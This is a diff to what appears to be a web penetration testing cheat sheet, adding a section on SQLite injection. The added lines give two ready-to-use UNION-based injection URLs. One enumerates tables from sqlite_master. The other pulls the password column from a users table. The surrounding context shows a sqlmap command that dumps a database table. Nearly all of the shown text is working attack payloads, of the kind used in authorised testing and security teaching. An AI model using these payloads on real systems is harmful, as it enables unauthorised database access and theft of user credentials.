@@ -845,6 +845,19 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 sqlmap --csrf-url=http://site.com/user-profile --csrf-token="<token>" -r request.txt -p'<parameters>' --random-agent -D <database> -T <table> --dump
 ```
 
+### SQLite Injection
+-> extracting table names, not displaying standard sqlite tables
+```
+http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
+```
+-> extracting table users  
+```
+http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
+```
+
+-> Reference  
+https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf  
+
 ### XPATH Notation
 e.g.  
 ```
